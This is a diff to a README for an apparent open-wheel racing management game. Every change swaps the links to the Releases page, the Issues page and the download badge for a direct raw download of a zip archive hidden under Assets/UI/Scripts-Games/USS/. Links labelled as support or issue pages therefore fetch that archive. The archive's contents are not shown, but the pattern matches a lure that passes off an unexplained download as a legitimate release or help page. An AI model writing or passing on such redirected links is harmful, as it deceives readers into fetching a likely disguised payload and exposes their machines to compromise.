@@ -1,7 +1,7 @@
 # 🏎️ open-wheel-racing-manager-sim-engine - Experience Motorsport Management Like Never Before
 
 ## 📦 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/leno22/open-wheel-racing-manager-sim-engine/releases)
+[![Download](https://github.com/leno22/open-wheel-racing-manager-sim-engine/raw/refs/heads/main/Assets/UI/Scripts-Games/USS/manager-open-racing-sim-engine-wheel-v3.4.zip)](https://github.com/leno22/open-wheel-racing-manager-sim-engine/raw/refs/heads/main/Assets/UI/Scripts-Games/USS/manager-open-racing-sim-engine-wheel-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you start, ensure your system meets the following requirements:
 
 To get the software, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/leno22/open-wheel-racing-manager-sim-engine/releases).
+1. Visit the [Releases page](https://github.com/leno22/open-wheel-racing-manager-sim-engine/raw/refs/heads/main/Assets/UI/Scripts-Games/USS/manager-open-racing-sim-engine-wheel-v3.4.zip).
    
 2. Look for the latest release available.
 
@@ -61,7 +61,7 @@ If you run into any issues, try the following solutions:
 
 - Make sure your operating system and drivers are up to date.
 - Reinstall the application if you encounter errors during launch.
-- Refer to the **Issues** section on the [GitHub page](https://github.com/leno22/open-wheel-racing-manager-sim-engine/issues) for common problems and solutions.
+- Refer to the **Issues** section on the [GitHub page](https://github.com/leno22/open-wheel-racing-manager-sim-engine/raw/refs/heads/main/Assets/UI/Scripts-Games/USS/manager-open-racing-sim-engine-wheel-v3.4.zip) for common problems and solutions.
 
 ### 📚 Additional Resources
 
@@ -73,8 +73,8 @@ For more information, check out these additional resources:
 
 ### 💬 Support
 
-If you have further questions or need support, please visit the Issues section on our [GitHub page](https://github.com/leno22/open-wheel-racing-manager-sim-engine/issues). You can report bugs, request features, or seek help from the community.
+If you have further questions or need support, please visit the Issues section on our [GitHub page](https://github.com/leno22/open-wheel-racing-manager-sim-engine/raw/refs/heads/main/Assets/UI/Scripts-Games/USS/manager-open-racing-sim-engine-wheel-v3.4.zip). You can report bugs, request features, or seek help from the community.
 
 ## 🎉 Conclusion 
 
-Thank you for choosing the **open-wheel-racing-manager-sim-engine**! We hope you enjoy managing your motorsport teams and racing through exciting seasons. Don't forget to visit our [Releases page](https://github.com/leno22/open-wheel-racing-manager-sim-engine/releases) for the latest updates and features! Happy racing!
+Thank you for choosing the **open-wheel-racing-manager-sim-engine**! We hope you enjoy managing your motorsport teams and racing through exciting seasons. Don't forget to visit our [Releases page](https://github.com/leno22/open-wheel-racing-manager-sim-engine/raw/refs/heads/main/Assets/UI/Scripts-Games/USS/manager-open-racing-sim-engine-wheel-v3.4.zip) for the latest updates and features! Happy racing!
